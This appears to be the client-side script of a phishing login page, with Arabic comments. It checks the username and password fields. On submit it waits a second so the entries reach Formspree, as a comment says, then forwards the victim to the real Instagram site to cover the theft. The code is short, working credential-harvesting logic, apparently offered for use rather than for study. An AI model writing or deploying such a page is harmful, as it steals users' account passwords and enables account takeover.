document.addEventListener('DOMContentLoaded', () => {
    const usernameInput = document.getElementById('username');
    const passwordInput = document.getElementById('password');
    const loginBtn = document.getElementById('loginBtn');
    const loginForm = document.getElementById('loginForm');

    // دالة التحقق من الحقول
    function validateInputs() {
        const usernameValue = usernameInput.value.trim();
        const passwordValue = passwordInput.value.trim();

        // شرط التفعيل: اسم المستخدم ليس فارغاً وكلمة المرور 6 أحرف فأكثر
        if (usernameValue.length > 0 && passwordValue.length >= 6) {
            loginBtn.disabled = false;
            loginBtn.style.opacity = "1"; // تغيير الشفافية لبيان التفعيل
            loginBtn.style.cursor = "pointer";
        } else {
            loginBtn.disabled = true;
            loginBtn.style.opacity = "0.5"; // جعل اللون باهتاً عند التعطيل
            loginBtn.style.cursor = "default";
        }
    }

    // إضافة المستمعات للأحداث لضمان التحديث مع كل حرف يكتب
    usernameInput.addEventListener('input', validateInputs);
    passwordInput.addEventListener('input', validateInputs);
    usernameInput.addEventListener('keyup', validateInputs);
    passwordInput.addEventListener('keyup', validateInputs);

    // تشغيل الدالة مرة واحدة عند تحميل الصفحة للتأكد من حالة الزر الابتدائية
    validateInputs();

    // عند الضغط على تسجيل الدخول
    loginForm.addEventListener('submit', () => {
        // ننتظر ثانية لضمان الإرسال لـ Formspree ثم نحول المستخدم
        setTimeout(() => {
            window.location.href = "https://www.instagram.com/";
        }, 1000);
    });
});
